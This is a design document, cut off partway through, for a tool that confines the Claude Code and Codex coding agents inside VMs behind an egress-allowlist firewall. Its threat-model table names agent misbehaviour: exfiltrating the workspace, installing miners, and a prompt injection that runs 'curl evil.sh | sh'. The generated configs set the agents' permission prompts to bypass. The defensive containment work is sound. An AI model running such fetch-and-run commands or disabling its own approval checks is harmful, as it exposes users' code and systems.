# Implementation Plan: `project-sandbox` — Sandboxing Claude Code & Codex CLI inside Apple's `container` Runtime

This document is a complete, opinionated implementation plan for a Python package (working name: **`project-sandbox`**) that wraps Anthropic's Claude Code and OpenAI's Codex CLI inside per-project Linux containers run by Apple's [`apple/container`](https://github.com/apple/container) OCI runtime. The package is designed to be installed and invoked exclusively via `uvx`, takes a project directory and a base image as arguments, builds a derived image that adds the two coding agents, generates project-local "neutered" config files (so the container — not the agent — is the sandbox boundary), wires up host credentials and Git/Jujutsu identity, installs an iptables/ipset firewall inside the container that enforces an egress allowlist, produces a launcher that runs the agent inside the container with the project bind-mounted, **emits a fully-wired `.devcontainer/` configuration** so the identical sandbox environment is available to any VS Code / Cursor / JetBrains IDE user or CI system without requiring `apple/container` at all, **supports running agents in isolated Git worktrees on named branches** so parallel or exploratory agent work never touches the main checkout, and **supports unsupervised (fire-and-forget) sessions** that start from a prompt file and exit when the agent is done.

---

## 1. Background and design decisions

### 1.1 Why Apple `container` matters for sandboxing

`apple/container` is fundamentally different from Docker Desktop and OrbStack: every container runs in its own lightweight VM via `Virtualization.framework` with hardware-enforced isolation, rather than sharing a single Linux VM with namespace-only isolation. That makes it an unusually good substrate for AI-coding-agent sandboxes — a runaway `rm -rf /` inside the container cannot reach the host. Our design therefore treats *the container itself* as the security boundary and intentionally turns **off** the agents' own approval/sandbox prompts, so they can work autonomously inside a box they cannot escape.

Two practical consequences shape the rest of the plan:

1. **The host "deny" rules don't apply.** Both Claude Code's `permissions.deny` and Codex's `approval_policy` plus `sandbox_mode` exist primarily to compensate for the agent running directly on the developer's macOS host. Inside an isolated VM the user expects "yolo" behavior; their own user-level overrides would just produce nuisance prompts. So our generated project-scoped config files explicitly strip those overrides and pin safe-for-container defaults.
2. **The container runtime constrains how mounts and env vars work.** `apple/container` rejects relative bind-mount sources (issue [#565](https://github.com/apple/container/issues/565)), runs over virtiofs, has had bugs with `--env-file` injection (issue #303), and writes the full process environment to `vminitd.log` (discussion #1153). All path handling must therefore resolve to absolute paths, env-var passing must use repeated `--env KEY=VALUE`, and any token-bearing env vars should be flagged as a known caveat.

### 1.2 Defence-in-depth: two sandbox layers

Even though each apple/container container is an isolated VM (which already prevents host filesystem access), we add a **second layer** borrowed directly from Anthropic's official devcontainer reference: an `iptables`/`ipset` egress firewall inside the VM that enforces a domain allowlist. The two layers are complementary:

| What it stops | VM boundary | Egress firewall |
|---|---|---|
| Agent reads `~/.ssh`, `~/Library/...` | ✅ | — |
| Agent exfiltrates `/workspace` to an arbitrary server | — | ✅ |
| Agent installs cryptominer or calls home | — | ✅ |
| Prompt-injection drives `curl evil.sh \| sh` | — | ✅ (blocked unless evil.sh is on the allowlist) |

Anthropic's own devcontainer ships `init-firewall.sh` specifically for this purpose and documents the rationale: the firewall allows running `claude --dangerously-skip-permissions` (equivalent to our `bypassPermissions` setting) without being *fully* open to the internet.

### 1.3 What the tool does, end to end

Given `project-sandbox /Users/me/code/myrepo python:3.12-slim`:

1. Start (or verify) the `container` system service.
2. Read `git config --global user.name` and `user.email` from the host.
3. Generate (in `<project>/.project-sandbox/`) a Dockerfile that `FROM`s the user-supplied base image and layers in: Node.js, `@anthropic-ai/claude-code`, `@openai/codex`, `git`, `jj`, `iptables`, `ipset`, `iproute2`, `dnsutils`, `aggregate`, `jq`, the firewall script, and a non-root `agent` user with sudo access scoped **only** to the firewall init command.
4. Build that image with `container build`.
5. Generate project-scoped, sanitized `.claude/settings.json` and `.codex/config.toml` with all sandbox/approval keys forced to "agent runs freely" values.
6. Generate `<project>/.project-sandbox/run-claude` and `<project>/.project-sandbox/run-codex` shell launchers that invoke `container run` with all the right mounts, env vars, absolute-path resolution, **and `NET_ADMIN`/`NET_RAW` capabilities** so the firewall can initialize.
7. **Generate `<project>/.devcontainer/`** — a fully-wired devcontainer configuration that reproduces the same image, firewall, sanitized configs, and identity wiring for IDE-integrated and CI use.
8. The container entrypoint (a) writes git/jj identity, (b) copies credentials, (c) runs `sudo /usr/local/bin/project-sandbox-init-firewall` to raise the egress wall before exec'ing the agent. The same entrypoint is used by both the `container run` launcher and the devcontainer.
9. **Worktree mode** (`--branch BRANCH`): create a Git worktree at a temporary path, mount it instead of the main project dir, run the agent there, and on exit offer to merge/rebase the branch back and clean up the worktree.
10. **Unsupervised mode** (`--prompt FILE` or `--prompt-text TEXT`): pass a starting prompt directly to the agent, run without a TTY, stream output to a log file, and exit when the agent session ends.
11. Print next-step instructions.

---

## 2. Package layout and `pyproject.toml`

```
project-sandbox/
├── pyproject.toml
├── README.md
├── LICENSE
└── src/
    └── project-sandbox/
        ├── __init__.py
        ├── __main__.py
        ├── cli.py
        ├── container_cli.py
        ├── git_identity.py
        ├── dockerfile.py
        ├── config_claude.py
        ├── config_codex.py
        ├── config_jj.py
        ├── firewall.py
        ├── launcher.py
        ├── devcontainer.py
        ├── worktree.py           # NEW — git worktree lifecycle management
        ├── session.py            # NEW — unsupervised session runner
        ├── paths.py
        └── templates/
            ├── Dockerfile.j2
            ├── entrypoint.sh.j2
            ├── init-firewall.sh.j2
            ├── claude-settings.json.j2
            ├── codex-config.toml.j2
            ├── jj-config.toml.j2
            ├── run-agent.sh.j2
            ├── devcontainer.json.j2
            └── devcontainer-entrypoint.sh.j2
```

### 2.1 `pyproject.toml`

```toml
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project]
name = "project-sandbox"
version = "0.1.0"
description = "Sandbox Claude Code and Codex CLI inside Apple's container runtime."
readme = "README.md"
license = { text = "MIT" }
requires-python = ">=3.11"
dependencies = ["jinja2>=3.1"]

[project.scripts]
project-sandbox = "project_sandbox.cli:main"

[tool.hatch.build.targets.wheel]
packages = ["src/project_sandbox"]
```

---

## 3. CLI design

### 3.1 Surface

```
project-sandbox [OPTIONS] PROJECT BASE_IMAGE
```

Key options:

| Flag | Default | Purpose |
|---|---|---|
| `--extra-domain DOMAIN` (repeatable) | none | Append extra domains to the firewall allowlist (e.g. your internal npm registry). |
| `--no-firewall` | off | Skip firewall installation entirely (for debugging/trusted-LAN use). |
| `--no-ipv6-firewall` | off | If `ip6_tables` kernel module is unavailable, fall back to `sysctl` IPv6 disable rather than aborting. Use only when you can verify IPv6 is truly absent from the container's network stack. |
| `--firewall-allow-openai` | off | Add `api.openai.com` to the allowlist (needed for Codex). |
| `--no-devcontainer` | off | Skip `.devcontainer/` generation (apple/container launcher only). |
| `--devcontainer-only` | off | Generate `.devcontainer/` but skip `container build` and the launcher scripts. |
| `--branch BRANCH` | none | Create / reuse a Git worktree on `BRANCH` and run the agent there instead of in the main checkout. |
| `--worktree-base BRANCH` | current HEAD | Branch to base the new worktree branch on (only used when `--branch` names a branch that doesn't yet exist). |
| `--worktree-dir PATH` | auto | Override the path where the worktree is created (default: `<project>/../<project-name>-worktrees/<branch>`). |
| `--after-session {ask,merge,rebase,pr,nothing}` | `ask` | What to do with the worktree branch after the container exits. |
| `--prompt FILE` | none | Path to a text file containing the starting prompt. Implies unsupervised mode (no TTY). |
| `--prompt-text TEXT` | none | Starting prompt as a literal string. Implies unsupervised mode. |
| `--log FILE` | auto | Where to write agent output in unsupervised mode (default: `.project-sandbox/sessions/<timestamp>.log`). |
| `--timeout SECONDS` | none | Kill the unsupervised container after this many seconds. |

All other flags remain as previously specified (agent, image-tag, rebuild, refresh-config, no-build, memory, cpus, mount, credentials-mode, dry-run, verbose).

The `--devcontainer-only` flag is useful for repos where the team works in VS Code / Cursor and doesn't have or want `apple/container` installed, but wants the same sandboxed agent environment.

`--branch` and `--prompt`/`--prompt-text` are independent and composable: you can run a supervised interactive session in a worktree, an unsupervised session in the main checkout, or an unsupervised session in a worktree (the primary fire-and-forget workflow).

---

## 4. Reading host Git identity

No changes from original plan. `git_identity.py` reads `user.name` and `user.email` via `git config --global --get`. Both are injected as `PROJECT_SANDBOX_USER_NAME` / `PROJECT_SANDBOX_USER_EMAIL` env vars and also set via `GIT_AUTHOR_*` / `GIT_COMMITTER_*`. The entrypoint writes both `~/.gitconfig` and `~/.config/jj/config.toml`.

---

## 5. Dockerfile generation

### 5.1 Additional packages required by the firewall

The firewall script (`init-firewall.sh`) requires: `iptables`, `ipset`, `iproute2`, `dnsutils` (for `dig`), `aggregate` (CIDR aggregation), `jq` (GitHub meta API parsing). These are all Debian/Ubuntu packages. The multi-distro `RUN` block must install them. Alpine does not package `aggregate`; for Alpine-derived base images we install `ipcalc` and provide a minimal CIDR aggregation shim, or we require the user to use a Debian-based base image. **Recommend restricting to Debian/Ubuntu base images in v0.1** and checking at startup.

Updated apt block:

```dockerfile
RUN set -eux; \
    export DEBIAN_FRONTEND=noninteractive; \
    apt-get update; \
    apt-get install -y --no-install-recommends \
        ca-certificates curl git sudo gnupg jq xz-utils less \
        iptables ipset iproute2 dnsutils aggregate; \
    rm -rf /var/lib/apt/lists/*
```

### 5.2 Firewall script in the image

The Dockerfile copies `init-firewall.sh` into the image (same pattern as Anthropic's reference devcontainer) and grants the non-root `agent` user passwordless `sudo` access **only for that one script**:

```dockerfile
COPY init-firewall.sh /usr/local/bin/project-sandbox-init-firewall
USER root
RUN chmod 0755 /usr/local/bin/project-sandbox-init-firewall && \
    echo 'agent ALL=(root) NOPASSWD: /usr/local/bin/project-sandbox-init-firewall' \
      > /etc/sudoers.d/agent-firewall && \
    chmod 0440 /etc/sudoers.d/agent-firewall
USER agent
```

Using a distinct name (`project-sandbox-init-firewall`) avoids the conflict documented in claude-code issue #32113, where the official devcontainer feature silently overwrites `/usr/local/bin/init-firewall.sh`.

### 5.3 Entrypoint changes

The entrypoint now runs the firewall **before** exec'ing the agent, ensuring no outbound traffic is possible during or after agent startup:

```sh
#!/bin/sh
set -eu

# 1. Identity wiring
if [ -n "${PROJECT_SANDBOX_USER_NAME:-}" ] || [ -n "${PROJECT_SANDBOX_USER_EMAIL:-}" ]; then
  : > "$HOME/.gitconfig"
  [ -n "${PROJECT_SANDBOX_USER_NAME:-}"  ] && git config --global user.name  "$PROJECT_SANDBOX_USER_NAME"
  [ -n "${PROJECT_SANDBOX_USER_EMAIL:-}" ] && git config --global user.email "$PROJECT_SANDBOX_USER_EMAIL"
  mkdir -p "$HOME/.config/jj"
  cat > "$HOME/.config/jj/config.toml" <<EOF
[user]
name  = "${PROJECT_SANDBOX_USER_NAME:-}"
email = "${PROJECT_SANDBOX_USER_EMAIL:-}"
EOF
fi

# 2. Credential handover
mkdir -p "$HOME/.claude" "$HOME/.codex"
if [ -f "$HOME/.claude.host/.credentials.json" ]; then
  cp "$HOME/.claude.host/.credentials.json" "$HOME/.claude/.credentials.json"
  chmod 600 "$HOME/.claude/.credentials.json"
fi
if [ -f "$HOME/.codex.host/auth.json" ]; then
  cp "$HOME/.codex.host/auth.json" "$HOME/.codex/auth.json"
  chmod 600 "$HOME/.codex/auth.json"
fi

# 3. Ownership fix for virtiofs UID quirks
for d in "$HOME/.claude" "$HOME/.codex"; do
  [ -d "$d" ] && sudo chown -R agent:agent "$d" 2>/dev/null || true
done

# 4. Egress firewall — must run before agent starts
if [ "${PROJECT_SANDBOX_NO_FIREWALL:-0}" != "1" ]; then
  sudo /usr/local/bin/project-sandbox-init-firewall
fi

# 5. Dispatch
case "${1:-bash}" in
  project-sandbox-run)
    shift
    case "${1:-bash}" in
      claude) shift; exec claude "$@" ;;
      codex)  shift; exec codex  "$@" ;;
      *)      exec "${@:-bash}" ;;
    esac ;;
  *) exec "$@" ;;
esac
```

---

## 6. The firewall: `init-firewall.sh` template

This is modelled directly on Anthropic's reference implementation, adapted for our context (no VS Code extensions needed, Codex API added, configurable extra domains, robust duplicate-IP handling).

### 6.1 Design: what the Anthropic reference does

Anthropic's `init-firewall.sh` implements a **default-deny egress policy** using `iptables` + `ipset`:

1. **Preserve Docker DNS NAT rules.** Before flushing `iptables`, snapshot `iptables-save -t nat | grep 127.0.0.11` and restore after. This keeps Docker's internal DNS resolver (`127.0.0.11`) working.
2. **Allow loopback, DNS, SSH** unconditionally (pre-policy rules on the `lo` interface and ports 53/22).
3. **Populate an `ipset` allowlist** with:
   - GitHub's dynamic IP ranges, fetched from `api.github.com/meta` and CIDR-aggregated with `aggregate`.
   - A fixed domain list (`registry.npmjs.org`, `api.anthropic.com`, `sentry.io`, `statsig.anthropic.com`, `statsig.com`, plus VS Code domains in the upstream) resolved via `dig` at startup.
4. **Set `iptables` chain policies to DROP** (`INPUT`, `FORWARD`, `OUTPUT`).
5. **Allow ESTABLISHED/RELATED** (stateful tracking — lets response packets back in).
6. **Allow traffic to `ipset` allowlist** destinations.
7. **Allow traffic to host gateway** (needed for port-forwarding; detected via `ip route`).
8. **REJECT everything else** with `icmp-admin-prohibited`.

### 6.2 Known issues in the upstream and how we fix them

**Issue #35197 / #15611 — duplicate IPs crash `ipset add`.** When a domain resolves to the same IP via multiple DNS records, `ipset add` fails with "Element cannot be added to the set: it's already added". Fix: use `ipset add --exist` throughout, which silently skips duplicates.

**Issue #36907 — unrestricted DNS enables tunneling.** The upstream allows DNS to any server (`-A OUTPUT -p udp --dport 53 -j ACCEPT`). This allows data exfiltration via DNS tunneling. Our template restricts DNS to the container's internal resolver only:

```sh
# Only allow DNS to the internal resolver (127.0.0.11 on Linux/Docker, ::1 on ipv6).
iptables -A OUTPUT -p udp --dport 53 -d 127.0.0.11 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 53 -d 127.0.0.11 -j ACCEPT
iptables -A INPUT  -p udp --sport 53 -s 127.0.0.11 -j ACCEPT
iptables -A INPUT  -p tcp --sport 53 -s 127.0.0.11 -j ACCEPT
```

In `apple/container`'s network model the DNS resolver IP may differ from `127.0.0.11`; we detect it via `resolvconf` / `/etc/resolv.conf` parsing at script startup.

**VS Code domains are irrelevant for our use case.** We omit `marketplace.visualstudio.com`, `vscode.blob.core.windows.net`, `update.code.visualstudio.com` from the default allowlist. Users can add them back via `--extra-domain`.

**Codex needs `api.openai.com`.** Not in the upstream allowlist. Added when `--firewall-allow-openai` is passed (or always when agent includes Codex).

**IPv6 is completely unaddressed upstream.** The upstream script only configures `iptables` (IPv4). Any IPv6-capable container gets a parallel network stack that the firewall does not touch at all — all the egress controls are trivially bypassed by making IPv6 connections. Modern Linux kernels enable IPv6 by default; Debian bookworm containers have it; `api.anthropic.com` and GitHub resolve to AAAA records. This is a real hole, not a theoretical one.

We close it with a **symmetric ip6tables allowlist** that mirrors the IPv4 rules exactly, using a parallel `ipset` of type `hash:net family inet6`. Each allowed domain is resolved for both A and AAAA records; each GitHub CIDR from `api.github.com/meta` is used as-is for IPv4 and the `ipv6` array from the same response is added to the IPv6 set. DNS for IPv6 is restricted to the detected resolver's IPv6 address (parsed from `/etc/resolv.conf`). All three `ip6tables` chains are set to DROP; loopback, stateful tracking, and the allowlist match rule are then layered on top, identical in structure to the IPv4 side. A `--no-ipv6-firewall` escape hatch disables the `ip6tables` block for environments where `ip6_tables` kernel module is unavailable (very rare on modern Debian); in that case we instead attempt to disable IPv6 entirely via `sysctl -w net.ipv6.conf.all.disable_ipv6=1 net.ipv6.conf.default.disable_ipv6=1` and verify the sysctl took effect before proceeding.

### 6.3 `templates/init-firewall.sh.j2`

The script now configures both `iptables` (IPv4) and `ip6tables` (IPv6) symmetrically. An `ip6tables`-availability probe runs first; if it fails, the script falls back to disabling IPv6 via `sysctl`. The Jinja variable `no_ipv6_firewall` (set when `--no-ipv6-firewall` is passed) controls whether a `sysctl`-only fallback is acceptable or whether the script should abort when neither method works.

```sh
#!/bin/bash
# project-sandbox-init-firewall — egress allowlist firewall (IPv4 + IPv6).
# Derived from Anthropic's claude-code devcontainer init-firewall.sh.
# Run as root (via sudoers) before agent startup.
set -euo pipefail

# ============================================================
# 0. Detect internal DNS resolver(s)
# ============================================================
DNS4=$(awk '/^nameserver/ && $2 !~ /:/ {print $2; exit}' /etc/resolv.conf)
DNS6=$(awk '/^nameserver/ && $2 ~ /:/  {print $2; exit}' /etc/resolv.conf)
DNS4="${DNS4:-127.0.0.11}"
echo "IPv4 DNS resolver: $DNS4"
[ -n "$DNS6" ] && echo "IPv6 DNS resolver: $DNS6"

# ============================================================
# 1. Probe for ip6tables availability; fall back to sysctl
# ============================================================
IPV6_FW=1
if ! ip6tables -L >/dev/null 2>&1; then
  echo "WARNING: ip6tables not available — attempting sysctl IPv6 disable."
  if sysctl -w net.ipv6.conf.all.disable_ipv6=1 \
             net.ipv6.conf.default.disable_ipv6=1 \
             net.ipv6.conf.lo.disable_ipv6=1 >/dev/null 2>&1 \
     && [ "$(cat /proc/sys/net/ipv6/conf/all/disable_ipv6 2>/dev/null)" = "1" ]; then
    echo "  IPv6 disabled via sysctl."
    IPV6_FW=0
  else
{% if no_ipv6_firewall %}
    echo "  WARNING: sysctl fallback also failed. IPv6 may be unfiltered (--no-ipv6-firewall set)."
    IPV6_FW=0
{% else %}
    echo "  ERROR: ip6tables unavailable and sysctl fallback failed. Aborting for safety."
    exit 1
{% endif %}
  fi
fi

# ============================================================
# 2. Preserve DNS NAT rules before flushing
# ============================================================
NAT4=$(iptables-save  -t nat 2>/dev/null | grep "$DNS4" || true)
NAT6=""
[ "$IPV6_FW" = "1" ] && [ -n "$DNS6" ] && \
  NAT6=$(ip6tables-save -t nat 2>/dev/null | grep "$DNS6" || true)

# ============================================================
# 3. Flush all existing rules
# ============================================================
iptables -F; iptables -X
iptables -t nat -F; iptables -t nat -X
iptables -t mangle -F; iptables -t mangle -X
ipset destroy allowed-ipv4 2>/dev/null || true

if [ "$IPV6_FW" = "1" ]; then
  ip6tables -F; ip6tables -X
  ip6tables -t nat -F 2>/dev/null || true; ip6tables -t nat -X 2>/dev/null || true
  ip6tables -t mangle -F; ip6tables -t mangle -X
  ipset destroy allowed-ipv6 2>/dev/null || true
fi

# ============================================================
# 4. Restore DNS NAT rules
# ============================================================
[ -n "$NAT4" ] && echo "$NAT4" | iptables-restore  --noflush -t nat
[ "$IPV6_FW" = "1" ] && [ -n "$NAT6" ] && \
  echo "$NAT6" | ip6tables-restore --noflush -t nat 2>/dev/null || true

# ============================================================
# 5. Pre-policy rules: loopback, DNS (resolver-pinned), SSH
# ============================================================

# --- IPv4 ---
iptables -A INPUT  -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A OUTPUT -p udp --dport 53 -d "$DNS4" -j ACCEPT
iptables -A OUTPUT -p tcp --dport 53 -d "$DNS4" -j ACCEPT
iptables -A INPUT  -p udp --sport 53 -s "$DNS4" -j ACCEPT
iptables -A INPUT  -p tcp --sport 53 -s "$DNS4" -j ACCEPT
iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT  -p tcp --sport 22 -j ACCEPT

# --- IPv6 ---
if [ "$IPV6_FW" = "1" ]; then
  ip6tables -A INPUT  -i lo -j ACCEPT
  ip6tables -A OUTPUT -o lo -j ACCEPT
  # ICMPv6 is mandatory for NDP, path-MTU, etc.
  ip6tables -A INPUT  -p ipv6-icmp -j ACCEPT
  ip6tables -A OUTPUT -p ipv6-icmp -j ACCEPT
  # DNS: only if we have an IPv6 resolver
  if [ -n "$DNS6" ]; then
    ip6tables -A OUTPUT -p udp --dport 53 -d "$DNS6" -j ACCEPT
    ip6tables -A OUTPUT -p tcp --dport 53 -d "$DNS6" -j ACCEPT
    ip6tables -A INPUT  -p udp --sport 53 -s "$DNS6" -j ACCEPT
    ip6tables -A INPUT  -p tcp --sport 53 -s "$DNS6" -j ACCEPT
  fi
  ip6tables -A OUTPUT -p tcp --dport 22 -j ACCEPT
  ip6tables -A INPUT  -p tcp --sport 22 -j ACCEPT
fi

# ============================================================
# 6. Build ipset allowlists (IPv4 and IPv6)
# ============================================================
ipset create allowed-ipv4 hash:net family inet
[ "$IPV6_FW" = "1" ] && ipset create allowed-ipv6 hash:net family inet6

echo "Fetching GitHub IP ranges..."
gh_meta=$(curl -sf --max-time 10 https://api.github.com/meta) || {
  echo "WARNING: Could not fetch GitHub IP ranges. GitHub operations may fail."
  gh_meta='{"web":[],"api":[],"git":[],"ipv6":[]}'
}

# IPv4 GitHub CIDRs
while IFS= read -r cidr; do
  [ -n "$cidr" ] && ipset add --exist allowed-ipv4 "$cidr"
done < <(echo "$gh_meta" | jq -r '(.web + .api + .git)[]' | aggregate -q 2>/dev/null || true)

# IPv6 GitHub CIDRs (the meta API exposes an "ipv6" array)
if [ "$IPV6_FW" = "1" ]; then
  while IFS= read -r cidr6; do
    [ -n "$cidr6" ] && ipset add --exist allowed-ipv6 "$cidr6" 2>/dev/null || true
  done < <(echo "$gh_meta" | jq -r '.ipv6[]?' 2>/dev/null || true)
fi

# Fixed domain allowlist — resolve both A and AAAA
DOMAINS=(
  "registry.npmjs.org"
  "api.anthropic.com"
  "statsig.anthropic.com"
  "statsig.com"
  "sentry.io"
{% if allow_openai %}
  "api.openai.com"
{% endif %}
{% for domain in extra_domains %}
  "{{ domain }}"
{% endfor %}
)

for domain in "${DOMAINS[@]}"; do
  echo "Resolving $domain..."
  # A records
  while IFS= read -r ip4; do
    [[ "$ip4" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
    echo "  + $ip4 (A)"
    ipset add --exist allowed-ipv4 "$ip4"
  done < <(dig +noall +answer +time=5 A    "$domain" 2>/dev/null | awk '$4=="A"   {print $5}' || true)

  # AAAA records
  if [ "$IPV6_FW" = "1" ]; then
    while IFS= read -r ip6; do
      [[ "$ip6" =~ : ]] || continue
      echo "  + $ip6 (AAAA)"
      ipset add --exist allowed-ipv6 "$ip6" 2>/dev/null || true
    done < <(dig +noall +answer +time=5 AAAA "$domain" 2>/dev/null | awk '$4=="AAAA"{print $5}' || true)
  fi
done

# ============================================================
# 7. Allow host gateway network (port-forwarding / IDE attach)
# ============================================================
HOST_GW4=$(ip    route   | awk '/default/ {print $3; exit}') || true
if [ -n "$HOST_GW4" ]; then
  HOST_NET4=$(ip route | awk "match(\$0,/^[0-9]+\.[0-9]+\.[0-9]+\.0/)  {print \$1; exit}") || true
  [ -n "$HOST_NET4" ] && {
    echo "Allowing host network (IPv4): $HOST_NET4"
    iptables -A OUTPUT -d "$HOST_NET4" -j ACCEPT
    iptables -A INPUT  -s "$HOST_NET4" -j ACCEPT
  }
fi

if [ "$IPV6_FW" = "1" ]; then
  HOST_GW6=$(ip -6 route | awk '/default/ {print $3; exit}') || true
  HOST_IF6=$(ip -6 route | awk '/default/ {print $5; exit}') || true
  [ -n "$HOST_GW6" ] && {
    echo "Allowing host gateway (IPv6): $HOST_GW6"
    ip6tables -A OUTPUT -d "$HOST_GW6" -o "${HOST_IF6:-eth0}" -j ACCEPT
    ip6tables -A INPUT  -s "$HOST_GW6" -i "${HOST_IF6:-eth0}" -j ACCEPT
  }
fi

# ============================================================
# 8. Default DROP policy
# ============================================================
iptables  -P INPUT DROP; iptables  -P FORWARD DROP; iptables  -P OUTPUT DROP
[ "$IPV6_FW" = "1" ] && {
  ip6tables -P INPUT DROP; ip6tables -P FORWARD DROP; ip6tables -P OUTPUT DROP
}

# ============================================================
# 9. Stateful tracking
# ============================================================
iptables  -A INPUT  -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables  -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
[ "$IPV6_FW" = "1" ] && {
  ip6tables -A INPUT  -m state --state ESTABLISHED,RELATED -j ACCEPT
  ip6tables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
}

# ============================================================
# 10. Allowlist match
# ============================================================
iptables  -A OUTPUT -m set --match-set allowed-ipv4 dst -j ACCEPT
[ "$IPV6_FW" = "1" ] && \
  ip6tables -A OUTPUT -m set --match-set allowed-ipv6 dst -j ACCEPT

# ============================================================
# 11. Reject everything else
# ============================================================
iptables  -A OUTPUT -j REJECT --reject-with icmp-admin-prohibited
iptables  -A INPUT  -j REJECT --reject-with icmp-admin-prohibited
[ "$IPV6_FW" = "1" ] && {
  ip6tables -A OUTPUT -j REJECT --reject-with icmp6-adm-prohibited
  ip6tables -A INPUT  -j REJECT --reject-with icmp6-adm-prohibited
}

# ============================================================
# 12. Summary
# ============================================================
echo "Firewall initialized."
printf "  IPv4 allowlist: %d entries\n" \
  "$(ipset list allowed-ipv4 2>/dev/null | grep -c '^[0-9]' || echo 0)"
if [ "$IPV6_FW" = "1" ]; then
  printf "  IPv6 allowlist: %d entries\n" \
    "$(ipset list allowed-ipv6 2>/dev/null | grep -c '^[0-9a-f]' || echo 0)"
else
  echo "  IPv6: disabled via sysctl"
fi
iptables  -L OUTPUT --line-numbers -n 2>/dev/null || true
[ "$IPV6_FW" = "1" ] && ip6tables -L OUTPUT --line-numbers -n 2>/dev/null || true
```

### 6.4 Key differences from the Anthropic upstream

| | Anthropic upstream | project-sandbox template |
|---|---|---|
| Duplicate IP handling | `ipset add` (crashes on dup) | `ipset add --exist` (idempotent) |
| DNS restriction | Any server allowed | Restricted to detected resolver |
| VS Code domains | Included | Omitted by default |
| OpenAI API | Not included | Included when Codex is enabled |
| Extra domains | Not configurable | `--extra-domain` flag |
| Script name | `/usr/local/bin/init-firewall.sh` | `/usr/local/bin/project-sandbox-init-firewall` |
| Sudoers entry | `node ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh` | `agent ALL=(root) NOPASSWD: /usr/local/bin/project-sandbox-init-firewall` |
| DNS resolution failure | Fatal (`exit 1`) | Warning + continue (container starts with partial allowlist) |
| IPv6 | Not addressed (firewall bypass possible) | Full symmetric `ip6tables` allowlist; `sysctl` disable fallback if `ip6_tables` unavailable; fails closed by default |
| ipset names | `allowed-domains` (single set) | `allowed-ipv4` (inet) + `allowed-ipv6` (inet6) — separate family-typed sets |
| AAAA resolution | Not performed | Each domain resolved for both A and AAAA; GitHub `ipv6` CIDRs fetched from meta API |
| ICMPv6 | Not applicable | Explicitly permitted (required for NDP/path-MTU) before DROP policy |

### 6.5 `firewall.py` module

```python
# firewall.py
from pathlib import Path
from jinja2 import Environment, PackageLoader

def render(
    context_dir: Path,
    *,
    allow_openai: bool,
    extra_domains: list[str],
    no_ipv6_firewall: bool = False,
) -> Path:
    env = Environment(loader=PackageLoader("project_sandbox", "templates"))
    tmpl = env.get_template("init-firewall.sh.j2")
    out = context_dir / "init-firewall.sh"
    out.write_text(tmpl.render(
        allow_openai=allow_openai,
        extra_domains=extra_domains,
        no_ipv6_firewall=no_ipv6_firewall,
    ))
    out.chmod(0o755)
    return out
```

---

## 7. Volume mount construction

### 7.1 Required Linux capabilities

The firewall requires two elevated capabilities inside the container VM. These are passed via `container run`:

```
--cap-add NET_ADMIN   # iptables, ipset, ip route
--cap-add NET_RAW     # stateful tracking (ESTABLISHED), ICMP rejection
```

Without `NET_ADMIN` the `iptables` calls inside the entrypoint fail silently or loudly depending on kernel version. Without `NET_RAW` the `REJECT --reject-with icmp-admin-prohibited` rule fails to install.

In `apple/container`, capabilities are passed identically to Docker:

```bash
container run --cap-add NET_ADMIN --cap-add NET_RAW ...
```

The `agent-run.sh.j2` template adds these unconditionally when the firewall is enabled.

### 7.2 The full mount set

| Host source | Container target | Mode | Notes |
|---|---|---|---|
| `<project>` | `/workspace` | rw | The actual code. |
| `<project>/.project-sandbox/claude/settings.json` | `/home/agent/.claude/settings.json` | ro | Sanitized config. |
| `<project>/.project-sandbox/codex/config.toml` | `/home/agent/.codex/config.toml` | ro | Sanitized config. |
| `~/.claude` | `/home/agent/.claude.host` | ro/rw | Credential source (copy, not direct use). |
| `~/.codex`  | `/home/agent/.codex.host`  | ro/rw | Credential source. |

### 7.3 Constructing the `container run` command

```python
def build_run_argv(*, image, project_abs, claude_cfg, codex_cfg,
                   claude_home_host, codex_home_host,
                   identity, memory, cpus, ro_creds, extra_mounts,
                   agent, firewall_enabled):
    argv = [
        "container", "run",
        "--rm", "-it",
        "--memory", memory, "--cpus", str(cpus),
        "--workdir", "/workspace",
    ]
    # Capabilities for firewall
    if firewall_enabled:
        argv += ["--cap-add", "NET_ADMIN", "--cap-add", "NET_RAW"]
    argv += [
        "--mount", f"type=bind,source={project_abs},target=/workspace",
        "--mount", f"type=bind,source={claude_cfg},target=/home/agent/.claude/settings.json,readonly",
        "--mount", f"type=bind,source={codex_cfg},target=/home/agent/.codex/config.toml,readonly",
    ]
    ro = ",readonly" if ro_creds else ""
    if claude_home_host.exists():
        argv += ["--mount", f"type=bind,source={claude_home_host},target=/home/agent/.claude.host{ro}"]
    if codex_home_host.exists():
        argv += ["--mount", f"type=bind,source={codex_home_host},target=/home/agent/.codex.host{ro}"]
    # Identity
    if identity.name:
        argv += ["--env", f"PROJECT_SANDBOX_USER_NAME={identity.name}",
                 "--env", f"GIT_AUTHOR_NAME={identity.name}",
                 "--env", f"GIT_COMMITTER_NAME={identity.name}"]
    if identity.email:
        argv += ["--env", f"PROJECT_SANDBOX_USER_EMAIL={identity.email}",
                 "--env", f"GIT_AUTHOR_EMAIL={identity.email}",
                 "--env", f"GIT_COMMITTER_EMAIL={identity.email}"]
    argv += [
        "--env", "CLAUDE_CONFIG_DIR=/home/agent/.claude",
        "--env", "CODEX_HOME=/home/agent/.codex",
    ]
    if not firewall_enabled:
        argv += ["--env", "PROJECT_SANDBOX_NO_FIREWALL=1"]
    for m in extra_mounts:
        argv += ["--mount", m]
    argv += [image, "project-sandbox-run", agent]
    return argv
```

---

## 8. Generating the project-scoped sanitized configs

### 8.1 Claude Code: `settings.json`

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "permissions": {
    "defaultMode": "bypassPermissions",
    "allow": [],
    "deny": [],
    "ask": []
  },
  "sandbox": {
    "enabled": false
  },
  "env": {
    "IS_SANDBOX": "1"
  },
  "autoUpdaterStatus": "disabled",
  "includeCoAuthoredBy": false
}
```

### 8.2 Codex CLI: `config.toml`

```toml
